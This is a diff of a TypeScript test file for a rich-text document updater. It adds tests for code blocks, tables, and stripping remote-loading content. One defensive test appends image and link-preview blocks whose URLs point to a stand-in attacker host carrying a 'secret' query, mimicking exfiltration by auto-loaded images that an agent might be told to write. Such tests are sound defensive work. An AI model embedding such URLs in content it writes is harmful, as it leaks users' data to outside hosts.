@@ -4,11 +4,11 @@ import { createRichTextYUpdate } from 'strategydance-design-system/lib/createRic
 import { getHeadlessRichTextEditor } from 'strategydance-design-system/lib/getHeadlessRichTextEditor'
 import { readRichTextYDoc } from 'strategydance-design-system/lib/readRichTextYDoc'
 import {
+  RICH_TEXT_EDITOR_BLOCKS,
   RICH_TEXT_YJS_FRAGMENT,
   type RichTextBlock,
   type RichTextInline,
 } from 'strategydance-design-system/lib/richText'
-import { RICH_TEXT_EDITOR_BLOCKS } from 'strategydance-design-system/lib/richTextEditorSchema'
 import { type RichTextYDocEdit, updateRichTextYDoc } from 'strategydance-design-system/lib/updateRichTextYDoc'
 import { initProseMirrorDoc } from 'y-prosemirror'
 import * as Y from 'yjs'
@@ -604,6 +604,95 @@ describe('updateRichTextYDoc', () => {
         expect(isWellFormed(doc)).toBe(true)
       })
     }
+  })
+
+  describe('writes code as code holds it', () => {
+    function code(text: string): RichTextBlock {
+      return { type: 'codeBlock', props: { language: 'typescript' }, content: [{ type: 'text', text }] }
+    }
+
+    it('keeps the line breaks of a replacement inside code in its text', () => {
+      const doc = createDoc([paragraph('Before'), code('const a = 1\nlog(a)')])
+
+      expect(updateRichTextYDoc(doc, { type: 'replaceText', find: 'log(a)', replace: 'log(a)\nlog(a + 1)' })).toEqual({
+        outcome: 'updated',
+      })
+      expect(isWellFormed(doc)).toBe(true)
+      expect(read(doc)).toEqual([paragraph('Before'), code('const a = 1\nlog(a)\nlog(a + 1)')])
+    })
+
+    it('finds text across the line breaks of code', () => {
+      const doc = createDoc([code('one\ntwo')])
+
+      expect(updateRichTextYDoc(doc, { type: 'replaceText', find: 'one\ntwo', replace: 'three' })).toEqual({
+        outcome: 'updated',
+      })
+      expect(read(doc)).toEqual([code('three')])
+    })
+
+    it('appends code with its line breaks', () => {
+      const doc = createDoc([paragraph('Before')])
+
+      expect(updateRichTextYDoc(doc, { type: 'append', blocks: [code('a\n\tb')] })).toEqual({ outcome: 'updated' })
+      expect(isWellFormed(doc)).toBe(true)
+      expect(read(doc)).toEqual([paragraph('Before'), code('a\n\tb')])
+    })
+  })
+
+  describe('writes in a table', () => {
+    function table(...rows: string[][]): RichTextBlock {
+      return {
+        type: 'table',
+        content: {
+          type: 'tableContent',
+          rows: rows.map(cells => ({ cells: cells.map(cell => (cell ? [{ type: 'text', text: cell }] : [])) })),
+        },
+      }
+    }
+
+    it("replaces a piece of text in one of a table's cells", () => {
+      const doc = createDoc([table(['Name', 'Score'], ['Ada', '9'])])
+
+      expect(updateRichTextYDoc(doc, { type: 'replaceText', find: 'Ada', replace: 'Grace' })).toEqual({
+        outcome: 'updated',
+      })
+      expect(isWellFormed(doc)).toBe(true)
+      expect(read(doc)).toEqual([table(['Name', 'Score'], ['Grace', '9'])])
+    })
+
+    it('appends a table, its empty cells included', () => {
+      const doc = createDoc([paragraph('Before')])
+
+      expect(updateRichTextYDoc(doc, { type: 'append', blocks: [table(['a', ''], ['', 'b'])] })).toEqual({
+        outcome: 'updated',
+      })
+      expect(isWellFormed(doc)).toBe(true)
+      expect(read(doc)).toEqual([paragraph('Before'), table(['a', ''], ['', 'b'])])
+    })
+  })
+
+  it('writes nothing that loads from elsewhere, as an agent might be told to', () => {
+    const doc = createDoc([paragraph('Before')])
+
+    expect(
+      updateRichTextYDoc(doc, {
+        type: 'append',
+        blocks: [
+          { type: 'image', props: { url: 'https://attacker.example/pixel.png?q=secret' } },
+          { type: 'videoEmbed', props: { url: 'https://vimeo.com/76979871' } },
+          {
+            type: 'linkPreview',
+            props: { url: 'https://example.com/', title: 'Example', imageUrl: 'https://attacker.example/q=secret' },
+          },
+          paragraph('After'),
+        ],
+      }),
+    ).toEqual({ outcome: 'updated' })
+    expect(read(doc)).toEqual([
+      paragraph('Before'),
+      { type: 'linkPreview', props: { url: 'https://example.com/', title: 'Example' } },
+      paragraph('After'),
+    ])
   })
 
   it('appends to a document with no text yet in place of its empty paragraph', () => {
